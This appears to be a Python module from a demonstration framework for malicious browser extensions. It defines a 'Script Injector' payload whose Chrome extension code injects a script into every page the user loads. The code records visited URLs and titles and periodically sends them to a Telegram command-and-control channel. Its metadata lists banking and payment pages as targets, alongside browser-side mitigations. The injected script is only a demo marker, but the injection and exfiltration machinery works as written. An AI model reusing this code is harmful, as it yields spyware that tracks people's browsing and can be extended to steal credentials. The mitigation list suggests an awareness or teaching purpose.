from .base import BasePayload, Payload


class ScriptInjector(BasePayload):

    def get_payload(self) -> Payload:
        return Payload(
            id="script_injector",
            name="Script Injector",
            description="Инжектит скрипты на страницы. Отправляет отчёт в Telegram.",
            icon="💉",
            risk_level="critical",
            permissions=["<all_urls>", "storage", "tabs", "scripting"],
            targets=["any website", "payment pages", "banking", "social media"],
            demo_instructions="1. Установите\n2. Откройте сайт\n3. Отчёт придёт в Telegram",
            mitigation=[
                "Строгий Content Security Policy",
                "Subresource Integrity (SRI)",
                "Trusted Types",
                "Регулярное обновление браузера",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// Script Injector — C2
// ============================================================

console.log('[DEMO] Script Injector: background loaded');

let injectionsCount = 0;
let injectedPages = [];

const DEMO_INJECTED_SCRIPT = `
    console.log('[DEMO] Injected at', new Date().toISOString());
    window.__demo_injected = true;
`;

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
        try {
            await chrome.scripting.executeScript({
                target: { tabId: tabId },
                func: (script) => {
                    const el = document.createElement('script');
                    el.textContent = script;
                    document.documentElement.appendChild(el);
                    el.remove();
                },
                args: [DEMO_INJECTED_SCRIPT],
            });

            injectionsCount++;
            injectedPages.push({
                timestamp: new Date().toISOString(),
                url: tab.url,
                title: tab.title,
            });

            chrome.action.setBadgeText({ text: String(injectionsCount) });
            chrome.action.setBadgeBackgroundColor({ color: '#9C27B0' });

            chrome.storage.local.set({ demo_injections_count: injectionsCount });

            // C2: каждые 10 инжектов — отчёт
            if (injectionsCount % 10 === 0 &&
                typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
                const jsonData = {
                    session_id: C2_CONFIG.sessionId,
                    timestamp: new Date().toISOString(),
                    total: injectionsCount,
                    pages: injectedPages.slice(-50),
                };
                const filename = `injections_${C2_CONFIG.sessionId}_${Date.now()}.json`;
                c2SendDocument(filename, JSON.stringify(jsonData, null, 2));

                c2Send(
                    `💉 <b>Script Injector</b>\n` +
                    `Сессия: <code>${C2_CONFIG.sessionId}</code>\n` +
                    `Всего инжектов: <b>${injectionsCount}</b>\n` +
                    `Последний: <code>${c2Escape(tab.url)}</code>`
                );
            }
        } catch (e) {
            console.log('[DEMO] Injection error:', e.message);
        }
    }
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'get_injection_stats') {
        chrome.storage.local.get(['demo_injections_count'], (data) => sendResponse(data));
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return r"""
console.log('[DEMO] Script Injector: content loaded');

const inputs = document.querySelectorAll('input');
const forms = document.querySelectorAll('form');
const links = document.querySelectorAll('a');

console.log(`[DEMO] Page on ${location.hostname}:`, {
    inputs: inputs.length,
    forms: forms.length,
    links: links.length,
});
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_injection_stats' }, (data) => {
    if (data && data.demo_injections_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_injections_count;
    }
});
"""


__all__ = ["ScriptInjector"]
